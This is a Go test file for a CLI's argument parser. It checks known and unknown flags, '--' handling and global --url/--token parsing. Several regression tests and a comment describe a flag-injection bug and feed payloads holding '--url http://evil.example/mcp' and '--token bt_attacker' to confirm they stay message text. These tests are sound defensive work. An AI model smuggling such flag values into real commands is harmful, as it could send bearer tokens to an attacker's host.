package main

import (
	"reflect"
	"strings"
	"testing"
)

// parseArgs: flags a command knows are taken out, everything else is the
// payload, and a token that looks like a flag and is unknown is refused.
// It used to land in the payload: `moshi reply <id> "text" --context x`
// delivered "text --context x".
func TestParseArgsTakesKnownFlagsAndKeepsTheRest(t *testing.T) {
	got, err := parseArgs([]string{"hello", "world", "--type", "incident", "more"}, []string{"type", "context"})
	if err != nil {
		t.Fatal(err)
	}
	want := parsed{flags: map[string]string{"type": "incident"}, rest: []string{"hello", "world", "more"}}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("got %+v, want %+v", got, want)
	}
}

func TestParseArgsRefusesAnUnknownFlagAndNamesTheKnownOnes(t *testing.T) {
	_, err := parseArgs([]string{"text", "--contxt", "x"}, []string{"type", "context"})
	if err == nil {
		t.Fatal("expected an error")
	}
	for _, want := range []string{"--contxt", "--type", "--context"} {
		if !contains(err.Error(), want) {
			t.Errorf("error %q should name %s", err, want)
		}
	}
}

func TestParseArgsRefusesAFlagWithoutAValue(t *testing.T) {
	_, err := parseArgs([]string{"text", "--type"}, []string{"type"})
	if err == nil || !contains(err.Error(), "--type needs a value") {
		t.Fatalf("got %v", err)
	}
}

func TestParseArgsTakesFlagEqualsValue(t *testing.T) {
	got, err := parseArgs([]string{"--type=question", "why?"}, []string{"type"})
	if err != nil {
		t.Fatal(err)
	}
	if got.flags["type"] != "question" || !reflect.DeepEqual(got.rest, []string{"why?"}) {
		t.Fatalf("got %+v", got)
	}
}

func TestParseArgsDoubleDashEndsTheFlags(t *testing.T) {
	// A payload that begins with "--" is a payload after "--".
	got, err := parseArgs([]string{"--type", "info", "--", "--not-a-flag", "-x"}, []string{"type"})
	if err != nil {
		t.Fatal(err)
	}
	want := parsed{flags: map[string]string{"type": "info"}, rest: []string{"--not-a-flag", "-x"}}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("got %+v, want %+v", got, want)
	}
}

func TestParseArgsLeavesWordsThatMerelyBeginWithADashAlone(t *testing.T) {
	// "-" is stdin, "-5" and "--" in the middle of a word are text.
	got, err := parseArgs([]string{"-", "-5", "a--b"}, []string{"type"})
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(got.rest, []string{"-", "-5", "a--b"}) {
		t.Fatalf("got %+v", got)
	}
}

func TestParseArgsTheLastValueWins(t *testing.T) {
	got, err := parseArgs([]string{"--type", "a", "--type", "b"}, []string{"type"})
	if err != nil {
		t.Fatal(err)
	}
	if got.flags["type"] != "b" {
		t.Fatalf("got %+v", got)
	}
}

func contains(s, sub string) bool {
	return len(sub) == 0 || (len(s) >= len(sub) && indexOf(s, sub) >= 0)
}

func indexOf(s, sub string) int {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return i
		}
	}
	return -1
}

// The bug: the global scan ran over every argument and knew nothing about
// "--". A message that contained "--url http://evil/mcp" moved the real
// bearer token to that host, and the CLI printed a success line.
func TestParseGlobalsStopsAtTheDoubleDash(t *testing.T) {
	g, err := parseGlobals(
		[]string{"send", "ops", "--", "please", "--url", "http://evil.example/mcp", "fix", "the", "build"},
		"bt_real",
	)
	if err != nil {
		t.Fatalf("err: %v", err)
	}
	if g.url != "" {
		t.Fatalf("a payload named the server: %q", g.url)
	}
	if g.token != "bt_real" {
		t.Fatalf("token changed: %q", g.token)
	}
	want := []string{"send", "ops", "--", "please", "--url", "http://evil.example/mcp", "fix", "the", "build"}
	if strings.Join(g.rest, " ") != strings.Join(want, " ") {
		t.Fatalf("rest = %q", g.rest)
	}
	// And the command's own parser turns that into the payload it was.
	p, err := parseArgs(g.rest[2:], []string{"type", "context"})
	if err != nil {
		t.Fatalf("parseArgs: %v", err)
	}
	if got := strings.Join(p.rest, " "); got != "please --url http://evil.example/mcp fix the build" {
		t.Fatalf("payload = %q", got)
	}
}

func TestParseGlobalsKeepsTheTokenAPayloadNames(t *testing.T) {
	g, err := parseGlobals([]string{"send", "ops", "--", "--token", "bt_attacker", "hello"}, "bt_real")
	if err != nil {
		t.Fatalf("err: %v", err)
	}
	if g.token != "bt_real" {
		t.Fatalf("a payload chose the identity: %q", g.token)
	}
}

func TestParseGlobalsTakesTheFlagsBeforeTheDoubleDash(t *testing.T) {
	g, err := parseGlobals(
		[]string{"--url", "https://mesh.example/mcp", "--token", "bt_x", "send", "ops", "hi"},
		"bt_env",
	)
	if err != nil {
		t.Fatalf("err: %v", err)
	}
	if g.url != "https://mesh.example/mcp" || g.token != "bt_x" {
		t.Fatalf("url=%q token=%q", g.url, g.token)
	}
	if strings.Join(g.rest, " ") != "send ops hi" {
		t.Fatalf("rest = %q", g.rest)
	}
}

func TestParseGlobalsTakesFlagEqualsValue(t *testing.T) {
	g, err := parseGlobals([]string{"--url=https://mesh.example/mcp", "--token=bt_y", "status"}, "")
	if err != nil {
		t.Fatalf("err: %v", err)
	}
	if g.url != "https://mesh.example/mcp" || g.token != "bt_y" {
		t.Fatalf("url=%q token=%q", g.url, g.token)
	}
}

func TestParseGlobalsRefusesAFlagWithoutAValue(t *testing.T) {
	for _, flag := range []string{"--url", "--token"} {
		if _, err := parseGlobals([]string{"send", "ops", flag}, ""); err == nil {
			t.Fatalf("%s without a value was accepted", flag)
		}
	}
}

func TestParseGlobalsLeavesEverythingElseInOrder(t *testing.T) {
	g, err := parseGlobals([]string{"receive", "--limit", "5", "-", "-5", "a--b"}, "")
	if err != nil {
		t.Fatalf("err: %v", err)
	}
	if strings.Join(g.rest, " ") != "receive --limit 5 - -5 a--b" {
		t.Fatalf("rest = %q", g.rest)
	}
}

// get, history and status used to go through no parser at all: a mistyped
// flag became the message id the server was asked for.
func TestNoFlagsRefusesAFlagAndKeepsTheRest(t *testing.T) {
	if got := parseArgsRestOrNil([]string{"msg_1"}); strings.Join(got, " ") != "msg_1" {
		t.Fatalf("rest = %q", got)
	}
	if _, err := parseArgs([]string{"--limit", "5", "msg_1"}, nil); err == nil {
		t.Fatal("an unknown flag was accepted")
	}
	// "--" still makes it text, for an id that begins with a dash.
	p, err := parseArgs([]string{"--", "--weird-id"}, nil)
	if err != nil {
		t.Fatalf("err: %v", err)
	}
	if strings.Join(p.rest, " ") != "--weird-id" {
		t.Fatalf("rest = %q", p.rest)
	}
}

func parseArgsRestOrNil(args []string) []string {
	p, err := parseArgs(args, nil)
	if err != nil {
		return nil
	}
	return p.rest
}
